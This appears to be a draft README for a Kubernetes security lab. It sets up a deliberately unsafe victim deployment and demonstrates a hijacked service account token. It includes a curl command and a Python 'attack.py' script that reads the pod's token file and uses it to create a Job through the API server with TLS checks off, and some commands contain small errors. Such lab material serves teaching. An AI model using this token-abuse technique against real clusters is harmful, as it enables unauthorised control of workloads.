# WIP

Any "kubernetes.default" can be contacted with POST, GET, REQUEST http queries
towards "apis/batch/v1/namespaces/default/jobs/" to do various manipulations.
Obsiously this is unsafe version and attack should demonstrate that hijacked
token file can potentially wreak havoc.

# Scenario

The container has been compromised, and the attacker has access level comparable
to the process.

By default the service account token is stored under
`/var/run/secretes/kubernetes.io/serviceaccount` as `token` file.

With the default setup (see victim manifests) the attacker can run -
essentially - run anything on the cluster including potentially escape onto the
host machine unless the cluster has SELinux enabled.

## Setup Scenario

Apply the `manifests/setup-victim.yaml` file to the cluster. There are two ways
provided to do it: kubectl or using headlamp at `http://localhost:30000`

### kubectl

1. Get access to the console either from VirtualBox GUI window using lab-lab
   credentials **or** over ssh using the following command:

   ```bash
   ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -l lab localhost -p 2222
   # Answer yes if asked by ssh about the connection
   ```
2. Create/copy `manifests/setup-victim.yaml` and apply the manifests:

   ```bash
   sudo kubectl apply -f setup-victim.yaml
   ```

### Headlamp

1. Make sure the virtual machine is online; open your browser and navigate to
   headlamp web GUI at `http://localhost:30000`.

2. Press **CREATE** button at the bottom left, copy-paste the content from
   `manifests/setup-victim.yaml`, and continue with **SAVE-APPLY**

## Scenario Problem

For example, the following payload will create `oops-hijacked-credentials` Job
on the cluster. It is harmless and only for demonstration purposes.

```bash
export TOKEN= # put token value here
```

```bash
curl -k -X POST -H "Authorization: Bearer $($TOKEN)" \
                -H "Content-Type: application/yaml" \
                "https://kubernetes.default/apis/batch/v1/namespaces/default/jobs" \
                --data '
apiVersion: batch/v1
kind: Job
metadata:
  name: oops-hijacked-credentials
  namespace: default
spec:
  template:
    metadata:
      name: oops-hijacked-credentials
      namespace: default
    spec:
      restartPolicy: Never
      containers:
        - name: oops
          image: python:3.15-bookworm
          command: ["bin/bash", "-c", "--"]
          args: ["while true; do sleep 60; done;"]
      serviceAccountName: job-controller
      automountServiceAccountToken: true
'
```

### Analogous Python Requests Script

For this scenario, the attacker has already gained control over the container
environment, so the demonstration of the _how_ the attacker got into the
container environment is not important.

The easiest way to demonstrate this is to: navigate to the headlamp web GUI
(`http://localhost:30000`), access the `target-pod` under Pods/Workloads, and
navigate to the pods web-console under the terminal button labelled as
`Terminal/Exec`.

The following script can be then copy-pasted into the terminal window:

```bash
python -m pip install requests
cat<<EOF > /attack.py
payload = '''apiVersion: batch/v1
kind: Job
metadata:
  name: oops-hijacked-credentials
  namespace: default
spec:
  template:
    metadata:
      name: oops-hijacked-credentials
      namespace: default
    spec:
      restartPolicy: Never
      containers:
        - name: oops
          image: python:3.15-bookworm
          command: ["bin/bash", "-c", "--"]
          args: ["while true; do sleep 60; done;"]
      serviceAccountName: kube-system
      automountServiceAccountToken: true
'''

with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
    token = f.read()

from requests import request
r = request("POST", \
"https://kubernetes.default/apis/batch/v1/namespaces/default/jobs", \
verify=False, \
data=bytes(payload, "utf-8"), \
headers={"Authorization": f"Bearer {token}", \
"Content-Type": "application/yaml"})

print(r.ok)
EOF
python /attack.py
```
